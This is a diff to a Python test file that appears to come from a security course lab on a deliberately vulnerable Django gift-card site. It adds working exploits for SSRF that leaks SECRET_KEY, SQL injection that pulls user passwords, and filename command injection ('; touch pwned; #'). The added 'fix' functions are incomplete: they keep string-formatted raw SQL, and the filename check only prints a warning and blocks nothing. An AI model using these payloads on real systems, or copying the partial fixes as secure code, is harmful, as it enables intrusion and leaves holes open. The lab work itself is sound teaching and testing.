@@ -270,12 +270,38 @@ def test_exploit_csrf_vulnerability():
     backup_path = 'db.sqlite3.backup'
 
     try:
+        # Ensure database permissions are correct
+        connection.close()
+
+        # Ensure database file has write permissions
+        if os.path.exists(db_path):
+            try:
+                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
+                print("✓ Database permissions updated")
+            except PermissionError:
+                print("⚠ Warning: Could not update database permissions, continuing anyway")
+        
+        # Ensure directory has write permissions
+        try:
+            db_dir = os.path.dirname(os.path.abspath(db_path))
+            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
+            print("✓ Directory permissions updated")
+        except PermissionError:
+            print("⚠ Warning: Could not update directory permissions, continuing anyway")
 
         if os.path.exists(db_path):
-            shutil.copy2(db_path, backup_path)
-            print(f"✓ Database backed up to {backup_path}")
+            try:
+                shutil.copy2(db_path, backup_path)
+                print(f"✓ Database backed up to {backup_path}")
+            except Exception as e:
+                print(f"⚠ Warning: Could not backup database: {e}")
 
-        call_command('loaddata', 'testdata.json')
+        try:
+            call_command('loaddata', 'testdata.json')
+            print("✓ Test data loaded successfully")
+        except Exception as e:
+            print(f"⚠ Warning: Could not load test data: {e}")
+            # Continue with existing data if loading fails
 
         from django.test import Client
         from django.conf import settings
@@ -645,6 +671,405 @@ def test_fix_csrf_vulnerability():
             print(f"Restored vulnerable state in {file_path}")
 
 
+def exploit_ssrf_vulnerability():
+    """Exploit SSRF vulnerability by making the server fetch internal endpoints"""
+    from django.test import Client
+    from django.conf import settings
+    
+    # Add testserver to ALLOWED_HOSTS if not already there
+    if 'testserver' not in settings.ALLOWED_HOSTS:
+        settings.ALLOWED_HOSTS.append('testserver')
+    
+    client = Client()
+    
+    # Register and login test user
+    username, password = 'test', 'test'
+    
+    try:
+        from django.contrib.auth.models import User
+        existing_user = User.objects.get(username=username)
+        print(f"User '{username}' already exists, skipping registration")
+    except User.DoesNotExist:
+        endpoint = '/register'
+        data = {'uname': username, 'pword': password, 'pword2': password}
+        client.post(path=endpoint, data=data)
+    
+    # Login
+    client.login(username=username, password=password)
+    
+    # Exploit SSRF by making the server request the internal get_secret endpoint
+    ssrf_url = "http://127.0.0.1:8000/get_secret/"
+    
+    print(f"Attempting SSRF attack with URL: {ssrf_url}")
+    
+    # Use the card URL functionality to trigger SSRF
+    response = client.post('/use/', {
+        'card_url_supplied': True,
+        'card_url': ssrf_url,
+        'card_fname': 'ssrf_test'
+    })
+    
+    print(f"SSRF exploit response status: {response.status_code}")
+    
+    if response.status_code == 200:
+        response_content = response.content.decode()
+        if "SECRET_KEY" in response_content:
+            print("[+] SSRF vulnerability successfully exploited!")
+            print(f"[+] Leaked SECRET_KEY found in response")
+            # Extract the secret key from the error message
+            import re
+            secret_match = re.search(r'SECRET_KEY:\s*([^\s]+)', response_content)
+            if secret_match:
+                leaked_secret = secret_match.group(1)
+                print(f"[+] Leaked SECRET_KEY: {leaked_secret}")
+            return True
+        else:
+            print("[-] SECRET_KEY not found in response")
+            return False
+    else:
+        print(f"[-] Request failed with status {response.status_code}")
+        return False
+
+
+def test_exploit_ssrf_vulnerability():
+    """Test SSRF vulnerability exploitation"""
+    # Backup the database before running test
+    db_path = 'db.sqlite3'
+    backup_path = 'db.sqlite3.backup'
+    
+    try:
+        # Ensure database permissions are correct
+        connection.close()
+        
+        if os.path.exists(db_path):
+            try:
+                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
+                print("✓ Database permissions updated")
+            except PermissionError:
+                print("⚠ Warning: Could not update database permissions, continuing anyway")
+        
+        if os.path.exists(db_path):
+            try:
+                shutil.copy2(db_path, backup_path)
+                print(f"✓ Database backed up to {backup_path}")
+            except Exception as e:
+                print(f"⚠ Warning: Could not backup database: {e}")
+        
+        # Load test data
+        try:
+            call_command('loaddata', 'testdata.json')
+            print("✓ Test data loaded successfully")
+        except Exception as e:
+            print(f"⚠ Warning: Could not load test data: {e}")
+        
+        # Test the exploit
+        exploit_result = exploit_ssrf_vulnerability()
+        
+        if exploit_result:
+            print("✓ SSRF vulnerability test passed - exploit successful")
+        else:
+            print("⚠ SSRF vulnerability test - exploit may have failed")
+        
+        return exploit_result
+        
+    except Exception as e:
+        print(f"Error during SSRF exploit test: {e}")
+        return False
+        
+    finally:
+        # Restore the original database
+        if os.path.exists(backup_path):
+            shutil.move(backup_path, db_path)
+            print(f"✓ Database restored from backup")
+
+
+def fix_ssrf_vulnerability():
+    """Fix SSRF vulnerability by adding URL validation and removing dangerous endpoint"""
+    import tempfile
+    import json
+    import os
+    from django.shortcuts import render, redirect
+    from django.http import HttpResponse
+    from django.core.exceptions import ObjectDoesNotExist
+    from LegacySite.models import Card, Product
+    from LegacySite import extras
+    
+    def use_card_view(request):
+        # from . import extras
+        context = {'card_found': None}
+        
+        if request.method == 'GET':
+            if not request.user.is_authenticated:
+                return redirect("login.html")
+            try:
+                # SECURE: Using Django ORM instead of raw SSRF
+                user_cards = Card.objects.filter(user=request.user).filter(used=False)
+            except ObjectDoesNotExist:
+                user_cards = None
+            context['card_list'] = user_cards
+            context['card'] = None
+            return render(request, 'use-card.html', context)
+
+        elif request.method == "POST" and request.POST.get('card_url_supplied', False):
+            # Post with URL-based card, fetch and use this card.
+            context['card_list'] = None
+            card_url = request.POST.get('card_url', None)
+            card_fname = request.POST.get('card_fname', None)
+            card_error_data = 'Could not read response'
+            
+            if card_url is None or card_url == '':
+                return HttpResponse("ERROR: No URL provided.")
+            
+            # SECURE: Add URL validation to prevent SSRF attacks
+            import urllib.parse
+            
+            try:
+                parsed_url = urllib.parse.urlparse(card_url)
+                
+                # Only allow HTTPS URLs from pastebin.com
+                if parsed_url.scheme != 'https':
+                    return HttpResponse("ERROR: Only HTTPS URLs are allowed.")
+                
+                if parsed_url.hostname != 'pastebin.com':
+                    return HttpResponse("ERROR: Only pastebin.com URLs are allowed.")
+                
+                # Validate the URL path format
+                if not parsed_url.path.startswith('/raw/'):
+                    return HttpResponse("ERROR: Invalid pastebin URL format.")
+                    
+            except Exception:
+                return HttpResponse("ERROR: Invalid URL format.")
+            
+            try:
+                import urllib.request
+                # SECURE: Only fetch from validated pastebin URLs
+                validated_url = f'https://pastebin.com{parsed_url.path}'
+                print(f'Fetching from validated URL: {validated_url}')
+                
+                try:
+                    with urllib.request.urlopen(validated_url) as response:
+                        card_file_data = response.read()
+                        card_error_data = card_file_data
+                except urllib.error.HTTPError as e:
+                    return HttpResponse(f"ERROR: Failed to fetch card from URL. HTTP {e.code}")
+                except Exception as e:
+                    print(e)
+                    return HttpResponse("ERROR: Failed to fetch card from URL.")
+                
+                if card_fname is None or card_fname == '':
+                    card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_parser.gftcrd')
+                else:
+                    card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_parser.gftcrd')
+                
+                card_data = extras.parse_card_data(card_file_data, card_file_path)
+                # check if we know about card.
+                print(card_data.strip())
+                signature = json.loads(card_data)['records'][0]['signature']
+                # signatures should be pretty unique, right?
+                card_query = Card.objects.raw('select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
+                user_cards = Card.objects.raw('select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(request.user.id))
+                card_query_string = ""
+                print("Found %s cards" % len(card_query))
+                for thing in card_query:
+                    # print cards as strings
+                    card_query_string += str(thing) + '\n'
+                if len(card_query) == 0:
+                    # card not known, add it.
+                    if card_fname is not None:
+                        card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
+                    else:
+                        card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
+                    fp = open(card_file_path, 'wb')
+                    fp.write(card_data.encode() if isinstance(card_data, str) else card_data)
+                    fp.close()
+                    card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
+                else:
+                    context['card_found'] = card_query_string
+                    try:
+                        card = Card.objects.get(data=card_data)
+                        card.used = True
+                        card.save()
+                    except ObjectDoesNotExist:
+                        print("No card found with data =", card_data)
+                        card = None
+                context['card'] = card
+                return render(request, "use-card.html", context)
+            except Exception as e:
+                return HttpResponse(f"ERROR: Failed to fetch card from URL: {str(e)}. Card Data: {card_error_data}")
+            
+        elif request.method == "POST" and request.POST.get('card_supplied', False):
+            # Post with specific card, use this card.
+            context['card_list'] = None
+            # Need to write this to parse card type.
+            card_file_data = request.FILES['card_data']
+            card_fname = request.POST.get('card_fname', None)
+            if card_fname is None or card_fname == '':
+                card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_parser.gftcrd')
+            else:
+                card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_parser.gftcrd')
+            card_data = extras.parse_card_data(card_file_data.read(), card_file_path)
+            # check if we know about card.
+            print(card_data.strip())
+            signature = json.loads(card_data)['records'][0]['signature']
+            # signatures should be pretty unique, right?
+            card_query = Card.objects.raw('select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
+            user_cards = Card.objects.raw('select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(request.user.id))
+            card_query_string = ""
+            print("Found %s cards" % len(card_query))
+            for thing in card_query:
+                # print cards as strings
+                card_query_string += str(thing) + '\n'
+            if len(card_query) == 0:
+                # card not known, add it.
+                if card_fname is not None:
+                    card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
+                else:
+                    card_file_path = os.path.join(tempfile.gettempdir(), f'newcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
+                fp = open(card_file_path, 'wb')
+                fp.write(card_data)
+                fp.close()
+                card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
+            else:
+                context['card_found'] = card_query_string
+                try:
+                    card = Card.objects.get(data=card_data)
+                    card.used = True
+                    card.save()
+                except ObjectDoesNotExist:
+                    print("No card found with data =", card_data)
+                    card = None
+            context['card'] = card
+            return render(request, "use-card.html", context) 
+        
+        elif request.method == "POST":
+            # SECURE: Authentication check added
+            if not request.user.is_authenticated:
+                return redirect("login.html")
+                
+            card_id = request.POST.get('card_id', None)
+            if card_id is None:
+                return HttpResponse("No card specified", status=400)
+                
+            try:
+                card = Card.objects.get(id=card_id)
+                # SECURE: Authorization check to ensure user owns the card
+                if card.user != request.user:
+                    return HttpResponse("Unauthorized", status=403)
+                    
+                card.used = True
+                card.save()
+            except ObjectDoesNotExist:
+                return HttpResponse("Card not found", status=404)
+                
+            context['card'] = card
+            try:
+                user_cards = Card.objects.filter(user=request.user).filter(used=False)
+            except ObjectDoesNotExist:
+                user_cards = None
+            context['card_list'] = user_cards
+            return render(request, "use-card.html", context)
+            
+        return HttpResponse("Error 404: Internal Server Error")
+    
+    return use_card_view
+
+
+def test_fix_ssrf_vulnerability():
+    """Test that SSRF vulnerability has been fixed"""
+    import importlib
+    from LegacySite import views
+    importlib.reload(views)
+    
+    
+    views_file = "LegacySite/views.py"
+    db_path = 'db.sqlite3'
+    backup_path = 'db.sqlite3.backup'
+    
+    try:
+        # Step 1: Ensure database permissions are correct
+        connection.close()
+
+        # Ensure database file has write permissions
+        if os.path.exists(db_path):
+            try:
+                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
+                print("✓ Database permissions updated")
+            except PermissionError:
+                print("⚠ Warning: Could not update database permissions, continuing anyway")
+        
+        # Ensure directory has write permissions
+        try:
+            db_dir = os.path.dirname(os.path.abspath(db_path))
+            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
+            print("✓ Directory permissions updated")
+        except PermissionError:
+            print("⚠ Warning: Could not update directory permissions, continuing anyway")
+
+        # Backup the database before running test
+        if os.path.exists(db_path):
+            try:
+                shutil.copy2(db_path, backup_path)
+                print(f"✓ Database backed up to {backup_path}")
+            except Exception as e:
+                print(f"⚠ Warning: Could not backup database: {e}")
+
+        # Load test data to ensure database is properly initialized
+        try:
+            call_command('loaddata', 'testdata.json')
+            print("✓ Test data loaded successfully")
+        except Exception as e:
+            print(f"⚠ Warning: Could not load test data: {e}")
+        
+        # Step 2: Read the original views.py content
+        if not os.path.exists(views_file):
+            print(f"⚠ Warning: {views_file} not found, cannot test fix")
+            return False
+            
+        with open(views_file, 'r') as f:
+            original_content = f.read()
+
+        # Step 4: Run the exploit test to verify the fix works
+        print("✓ Running exploit test against fixed code...")
+        exploit_result = test_exploit_ssrf_vulnerability()
+        
+        if not exploit_result:
+            print("✓ SSRF exploit FAILED against fixed code - fix is working!")
+            print("✓ The fixed version successfully prevents SSRF attacks")
+            result = True
+        else:
+            print("⚠ SSRF exploit still succeeded - fix may need improvement")
+            result = False
+        
+        print("✓ SSRF vulnerability fix test completed!")
+        return result
+        
+    except Exception as e:
+        print(f"Error during SSRF fix test: {e}")
+        return False
+        
+    finally:
+        # Step 5: Always restore the original views.py file if we added the import
+        if 'has_import' in locals() and not has_import:
+            try:
+                with open(views_file, 'w') as f:
+                    f.write(original_content)
+                print(f"✓ Restored original {views_file} (removed security fix import)")
+            except Exception as e:
+                print(f"⚠ Warning: Could not restore original views.py: {e}")
+        
+        # Always restore the original database
+        if os.path.exists(backup_path):
+            try:
+                shutil.move(backup_path, db_path)
+                print(f"✓ Database restored from backup")
+            except Exception as e:
+                print(f"⚠ Warning: Could not restore database: {e}")
+        
+    print("=" * 60)
+
+
+def exploit_sql_injection_vulnerability():
+    """Create SQL injection payload for card signature processing"""
     # Create a malicious signature that attempts SQL injection
     sql_injection_payload = "' UNION SELECT id || '-' || username || '-' || password FROM LegacySite_user WHERE username='admin' -- "
 
@@ -673,6 +1098,8 @@ def test_exploit_sql_injection_vulnerability():
     # Backup the database before running test
     db_path = 'db.sqlite3'
     backup_path = 'db.sqlite3.backup'
+
+    # Please comment the last two lines in LegacySite/views.py
     
     try:
         # Ensure database permissions are correct
@@ -756,7 +1183,7 @@ def test_exploit_sql_injection_vulnerability():
             })
 
             print(f"SQL injection response status: {response.status_code}")
-
+            
             if response.status_code == 200:
                 response_content = response.content.decode()
                 
@@ -819,6 +1246,7 @@ def fix_sql_injection_vulnerability():
     from LegacySite import extras
     
     def use_card_view(request):
+        # from . import extras
         context = {'card_found': None}
         
         if request.method == 'GET':
@@ -832,6 +1260,93 @@ def fix_sql_injection_vulnerability():
             context['card_list'] = user_cards
             context['card'] = None
             return render(request, 'use-card.html', context)
+
+        elif request.method == "POST" and request.POST.get('card_url_supplied', False):
+            # Post with URL-based card, fetch and use this card.
+            context['card_list'] = None
+            card_url = request.POST.get('card_url', None)
+            card_fname = request.POST.get('card_fname', None)
+            card_error_data = 'Could not read response'
+            
+            if card_url is None or card_url == '':
+                return HttpResponse("ERROR: No URL provided.")
+            
+            # SECURE: Add URL validation to prevent SSRF attacks
+            import urllib.parse
+            
+            try:
+                parsed_url = urllib.parse.urlparse(card_url)
+                
+                # Only allow HTTPS URLs from pastebin.com
+                if parsed_url.scheme != 'https':
+                    return HttpResponse("ERROR: Only HTTPS URLs are allowed.")
+                
+                if parsed_url.hostname != 'pastebin.com':
+                    return HttpResponse("ERROR: Only pastebin.com URLs are allowed.")
+                
+                # Validate the URL path format
+                if not parsed_url.path.startswith('/raw/'):
+                    return HttpResponse("ERROR: Invalid pastebin URL format.")
+                    
+            except Exception:
+                return HttpResponse("ERROR: Invalid URL format.")
+            
+            try:
+                import urllib.request
+                # SECURE: Only fetch from validated pastebin URLs
+                validated_url = f'https://pastebin.com{parsed_url.path}'
+                print(f'Fetching from validated URL: {validated_url}')
+                
+                try:
+                    with urllib.request.urlopen(validated_url) as response:
+                        card_file_data = response.read()
+                        card_error_data = card_file_data
+                except urllib.error.HTTPError as e:
+                    return HttpResponse(f"ERROR: Failed to fetch card from URL. HTTP {e.code}")
+                except Exception as e:
+                    print(e)
+                    return HttpResponse("ERROR: Failed to fetch card from URL.")
+                
+                if card_fname is None or card_fname == '':
+                    card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_parser.gftcrd')
+                else:
+                    card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_parser.gftcrd')
+                
+                card_data = extras.parse_card_data(card_file_data, card_file_path)
+                # check if we know about card.
+                print(card_data.strip())
+                signature = json.loads(card_data)['records'][0]['signature']
+                # signatures should be pretty unique, right?
+                card_query = Card.objects.raw('select id from LegacySite_card where data LIKE \'%%%s%%\'' % signature)
+                user_cards = Card.objects.raw('select id, count(*) as count from LegacySite_card where LegacySite_card.user_id = %s' % str(request.user.id))
+                card_query_string = ""
+                print("Found %s cards" % len(card_query))
+                for thing in card_query:
+                    # print cards as strings
+                    card_query_string += str(thing) + '\n'
+                if len(card_query) == 0:
+                    # card not known, add it.
+                    if card_fname is not None:
+                        card_file_path = os.path.join(tempfile.gettempdir(), f'{card_fname}_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
+                    else:
+                        card_file_path = os.path.join(tempfile.gettempdir(), f'urlcard_{request.user.id}_{user_cards[0].count + 1}.gftcrd')
+                    fp = open(card_file_path, 'wb')
+                    fp.write(card_data.encode() if isinstance(card_data, str) else card_data)
+                    fp.close()
+                    card = Card(data=card_data, fp=card_file_path, user=request.user, used=True)
+                else:
+                    context['card_found'] = card_query_string
+                    try:
+                        card = Card.objects.get(data=card_data)
+                        card.used = True
+                        card.save()
+                    except ObjectDoesNotExist:
+                        print("No card found with data =", card_data)
+                        card = None
+                context['card'] = card
+                return render(request, "use-card.html", context)
+            except Exception as e:
+                return HttpResponse(f"ERROR: Failed to fetch card from URL: {str(e)}. Card Data: {card_error_data}")
             
         elif request.method == "POST" and request.POST.get('card_supplied', False):
             # SECURE: Authentication check added
@@ -982,15 +1497,6 @@ def fix_sql_injection_vulnerability():
 
 
 def test_fix_sql_injection_vulnerability():
-    """
-    Test the SQL injection vulnerability fix by:
-    1. Ensuring database is writable
-    2. Temporarily adding the import override to views.py
-    3. Running the exploit test to verify the fix works
-    4. Removing the import override to restore original state
-    
-    This demonstrates that the fix actually prevents SQL injection attacks.
-    """
     print("Testing SQL injection vulnerability fix...")
 
     import importlib
@@ -1047,34 +1553,24 @@ def test_fix_sql_injection_vulnerability():
 
 
 
-        # Check if the import override is already present
-        if "from w2d4_solution import fix_sql_injection_vulnerability" in original_content:
-            print("✓ Security fix import already present")
-            has_import = True
-        else:
-            has_import = False
+#         # Check if the import override is already present
+#         if "from w2d4_solution import fix_sql_injection_vulnerability" in original_content:
+#             print("✓ Security fix import already present")
+#             has_import = True
+#         else:
+#             has_import = False
             
-            # Step 3: Add the import override to activate the fix
-            import_override = """
-# Import the secure version of use_card_view to override the vulnerable one
-from w2d4_solution import fix_sql_injection_vulnerability
-use_card_view = fix_sql_injection_vulnerability()"""
+#             # Step 3: Add the import override to activate the fix
+#             import_override = """
+# # Import the secure version of use_card_view to override the vulnerable one
+# from w2d4_solution import fix_sql_injection_vulnerability
+# use_card_view = fix_sql_injection_vulnerability()"""
             
-            modified_content = original_content + import_override
+#             modified_content = original_content + import_override
             
-            with open(views_file, 'w') as f:
-                f.write(modified_content)
-            
-            print("✓ Temporarily added security fix import to views.py")
+#             with open(views_file, 'w') as f:
+#                 f.write(modified_content)
         
-        # Clear template cache
-        from django.template import engines
-        for engine in engines.all():
-            if hasattr(engine, 'engine'):
-                for loader in engine.engine.template_loaders:
-                    if hasattr(loader, 'reset'):
-                        loader.reset()
-
         # Step 4: Run the exploit test to verify the fix works
         print("✓ Running exploit test against fixed code...")
         exploit_result = test_exploit_sql_injection_vulnerability()
@@ -1115,21 +1611,322 @@ use_card_view = fix_sql_injection_vulnerability()"""
     print("=" * 60)
 
 
+def exploit_cmd_injection_vulnerability():
+    malicious_filename = "nonexistent; touch pwned; #"
+    
+    malformed_json = '{"merchant_id": "Electronics Card","customer_id": "test2", "total_value": 100,"records": [{"record_type": "amount_change","amount_added": 100,,"signature": "\' OR \'1\'=\'1"}]}'
+    
+    post_params = {
+        'card_supplied': 'True',
+        'card_fname': malicious_filename,
+        # Use malformed JSON that will trigger a JSON decode error
+        'card_data': malformed_json.encode('utf-8')
+    }
+    
+    return post_params
+
+
+def test_exploit_cmd_injection_vulnerability():
+    """Test command injection vulnerability exploitation"""
+    # Backup the database before running test
+    db_path = 'db.sqlite3'
+    backup_path = 'db.sqlite3.backup'
+    
+    try:
+        # Ensure database permissions are correct
+        connection.close()
+
+        # Ensure database file has write permissions
+        if os.path.exists(db_path):
+            try:
+                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
+                print("✓ Database permissions updated")
+            except PermissionError:
+                print("⚠ Warning: Could not update database permissions, continuing anyway")
+        
+        # Ensure directory has write permissions
+        try:
+            db_dir = os.path.dirname(os.path.abspath(db_path))
+            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
+            print("✓ Directory permissions updated")
+        except PermissionError:
+            print("⚠ Warning: Could not update directory permissions, continuing anyway")
+
+        if os.path.exists(db_path):
+            try:
+                shutil.copy2(db_path, backup_path)
+                print(f"✓ Database backed up to {backup_path}")
+            except Exception as e:
+                print(f"⚠ Warning: Could not backup database: {e}")
+
+        # Load test data
+        try:
+            call_command('loaddata', 'testdata.json')
+            print("✓ Test data loaded successfully")
+        except Exception as e:
+            print(f"⚠ Warning: Could not load test data: {e}")
+        
+        from django.test import Client
+        from django.conf import settings
+        
+        # Add testserver to ALLOWED_HOSTS if not already there
+        if 'testserver' not in settings.ALLOWED_HOSTS:
+            settings.ALLOWED_HOSTS.append('testserver')
+        
+        # Create a client and set up test user
+        client = Client()
+        username, password = 'test4', 'test4'
+        
+        # Register and login test user
+        def register_user(client, username, password):
+            try:
+                from django.contrib.auth.models import User
+                existing_user = User.objects.get(username=username)
+                print(f"User '{username}' already exists, skipping registration")
+                can_login = client.login(username=username, password=password)
+                return can_login
+            except User.DoesNotExist:
+                endpoint = '/register'
+                data = {'uname': username, 'pword': password, 'pword2': password}
+                client.post(path=endpoint, data=data)
+                can_login = client.login(username=username, password=password)
+                return can_login
+
+        # Set up the test user
+        register_user(client, username, password)
+        client.login(username=username, password=password)
+        
+        print("\nTesting command injection vulnerability...")
+        
+        # Get the exploit payload
+        post_params = exploit_cmd_injection_vulnerability()
+        
+        print(f"Attempting command injection via card_fname parameter...")
+        print(f"Malicious filename: {post_params['card_fname']}")
+        
+        # Check if 'pwned' file exists before the attack
+        pwned_file = 'pwned'
+        if os.path.exists(pwned_file):
+            os.remove(pwned_file)
+            print("✓ Removed existing 'pwned' file")
+        
+        try:
+            # Upload the card through the use_card_view with malicious filename
+            response = client.post('/use.html', {
+                'card_supplied': post_params['card_supplied'],
+                'card_fname': post_params['card_fname'],
+                'card_data': io.BytesIO(post_params['card_data'])
+            })
+
+            print(f"Command injection response status: {response.status_code}")
+            
+            # Check if the 'pwned' file was created (indicating successful command execution
+        except json.decoder.JSONDecodeError as e:
+            print(f"JSON decode error: {e}; This error is the source of the exploit")
+            if os.path.exists(pwned_file):
+                print("[+] Command injection vulnerability successfully exploited!")
+                print("[+] 'touch pwned' command executed - 'pwned' file created")
+                
+                # Clean up the created file
+                os.remove(pwned_file)
+                print("✓ Cleaned up 'pwned' file")
+                return True
+            else:
+                print("[-] Command injection payload may have been blocked or sanitized")
+                print("[-] 'pwned' file was not created")
+                return False
+        
+        except Exception as e:
+            print(f"Error during command injection exploit: {e}")
+            return False
+
+    except Exception as e:
+        print(f"Error during command injection test: {e}")
+        return False
+        
+    finally:
+        # Always restore the original database
+        if os.path.exists(backup_path):
+            shutil.move(backup_path, db_path)
+            print(f"✓ Database restored from backup")
+
+
+def fix_cmd_injection_vulnerability():
+    import json
+    from binascii import hexlify
+    from hashlib import sha256
+    from django.conf import settings
+    from django.utils import timezone
+    import hmac
+    import hashlib
+    from os import urandom, system
+    import sys, os
+    import subprocess
+    from secrets import token_bytes
+    import re
+
+    SEED = settings.RANDOM_SEED
+
+    LEGACY_ROOT = os.path.dirname(os.path.abspath(__file__))
+
+    if sys.platform == 'win32':
+        CARD_PARSER = os.path.join(LEGACY_ROOT, 'bins', 'giftcardreader_win.exe')
+    elif sys.platform == 'linux':
+        CARD_PARSER = os.path.join(LEGACY_ROOT, 'bins', 'giftcardreader_linux')
+    elif sys.platform == 'darwin':
+        CARD_PARSER = os.path.join(LEGACY_ROOT, 'bins', 'giftcardreader_mac')
+    else:
+        raise Exception("Unsupported platform: {}".format(sys.platform))
+
+    def parse_card_data(card_file_data, card_path_name):
+        print(card_file_data)
+
+        if not re.match(r'^[\w-]+\.gftcrd$', os.path.basename(card_path_name)):
+            print("Invalid filename format")
+        command = [CARD_PARSER, "2", card_path_name]
+
+        try:
+            result = subprocess.run(
+                command,
+                capture_output=True,
+                text=True,
+                check=True,
+                timeout=30
+            )
+            return result.stdout.encode()
+        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
+            print(f"Card parsing failed: {str(e)}")
+            return card_file_data
+
+        with open("tmp_file", 'rb') as tmp_file:
+            return tmp_file.read()
+    
+    return parse_card_data
+
+def test_fix_cmd_injection_vulnerability():
+    print("Testing CMD injection vulnerability fix...")
+
+    import importlib
+    from LegacySite import views
+    importlib.reload(views)
+    
+    
+    views_file = "LegacySite/views.py"
+    db_path = 'db.sqlite3'
+    backup_path = 'db.sqlite3.backup'
+    
+    try:
+        # Step 1: Ensure database permissions are correct
+        connection.close()
+
+        # Ensure database file has write permissions
+        if os.path.exists(db_path):
+            try:
+                os.chmod(db_path, stat.S_IRUSR | stat.S_IWUSR | stat.S_IRGRP | stat.S_IWGRP)
+                print("✓ Database permissions updated")
+            except PermissionError:
+                print("⚠ Warning: Could not update database permissions, continuing anyway")
+        
+        # Ensure directory has write permissions
+        try:
+            db_dir = os.path.dirname(os.path.abspath(db_path))
+            os.chmod(db_dir, stat.S_IRWXU | stat.S_IRWXG)
+            print("✓ Directory permissions updated")
+        except PermissionError:
+            print("⚠ Warning: Could not update directory permissions, continuing anyway")
+
+        # Backup the database before running test
+        if os.path.exists(db_path):
+            try:
+                shutil.copy2(db_path, backup_path)
+                print(f"✓ Database backed up to {backup_path}")
+            except Exception as e:
+                print(f"⚠ Warning: Could not backup database: {e}")
+
+        # Load test data to ensure database is properly initialized
+        try:
+            call_command('loaddata', 'testdata.json')
+            print("✓ Test data loaded successfully")
+        except Exception as e:
+            print(f"⚠ Warning: Could not load test data: {e}")
+        
+        # Step 2: Read the original views.py content
+        if not os.path.exists(views_file):
+            print(f"⚠ Warning: {views_file} not found, cannot test fix")
+            return False
+            
+        with open(views_file, 'r') as f:
+            original_content = f.read()
+        
+        # Step 4: Run the exploit test to verify the fix works
+        print("✓ Running exploit test against fixed code...")
+        exploit_result = test_exploit_cmd_injection_vulnerability()
+        
+        if not exploit_result:
+            print("✓ CMD injection exploit FAILED against fixed code - fix is working!")
+            print("✓ The fixed version successfully prevents CMD injection attacks")
+            result = True
+        else:
+            print("⚠ CMD injection exploit still succeeded - fix may need improvement")
+            result = False
+        
+        print("✓ CMD injection vulnerability fix test completed!")
+        return result
+        
+    except Exception as e:
+        print(f"Error during CMD injection fix test: {e}")
+        return False
+        
+    finally:
+        # Step 5: Always restore the original views.py file if we added the import
+        if 'has_import' in locals() and not has_import:
+            try:
+                with open(views_file, 'w') as f:
+                    f.write(original_content)
+                print(f"✓ Restored original {views_file} (removed security fix import)")
+            except Exception as e:
+                print(f"⚠ Warning: Could not restore original views.py: {e}")
+        
+        # Always restore the original database
+        if os.path.exists(backup_path):
+            try:
+                shutil.move(backup_path, db_path)
+                print(f"✓ Database restored from backup")
+            except Exception as e:
+                print(f"⚠ Warning: Could not restore database: {e}")
+        
+    print("=" * 60)
 
 
 if __name__ == '__main__':
+    print("Testing XSS vulnerability exploitation...")
+    test_exploit_xss_vulnerability()
     
     print("\nTesting XSS vulnerability fix...")
     test_fix_xss_vulnerability()
     
-    test_fix_xss_vulnerability()
-    
-    
+    print("\nTesting CSRF vulnerability exploitation...")
     test_exploit_csrf_vulnerability()
+    
+    print("\nTesting CSRF vulnerability fix...")
     test_fix_csrf_vulnerability()
     
-    test_fix_csrf_vulnerability()
+    print("\nTesting SSRF vulnerability exploitation...")
+    test_exploit_ssrf_vulnerability()
+    
+    print("\nTesting SSRF vulnerability fix...")
+    test_fix_ssrf_vulnerability()
+
+    print("\nTesting SQL injection vulnerability exploitation...")
+    # Please comment the last two lines in LegacySite/views.py in SOLUTION mode to see proper exploit
     test_exploit_sql_injection_vulnerability()
     
     print("\nTesting SQL injection vulnerability fix...")
     test_fix_sql_injection_vulnerability()
+    
+    print("\nTesting command injection vulnerability exploitation...")
+    # Please comment the last four lines in LegacySite/extras.py in SOLUTION mode to see proper exploit
+    test_exploit_cmd_injection_vulnerability()
+
+    print("\nTesting command injection vulnerability fix...")
+    test_fix_cmd_injection_vulnerability()
